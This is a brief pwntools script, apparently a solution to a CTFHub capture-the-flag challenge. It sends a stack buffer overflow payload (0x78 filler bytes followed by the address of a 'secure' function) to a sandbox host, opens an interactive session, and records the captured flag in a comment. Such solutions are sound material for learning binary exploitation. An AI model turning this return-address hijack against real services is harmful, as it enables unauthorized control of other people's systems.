from pwn import *
sh = remote("challenge-eda77aa93937d483.sandbox.ctfhub.com", 35931)

secure = 0x4007B8
# payload = b'a'*0x78 + p64(secure)
payload = flat(b'a'*0x78, p64(secure))

sh.sendline(payload)
sh.interactive()

# ctfhub{0c2046a5b4f7e07873ab372f}
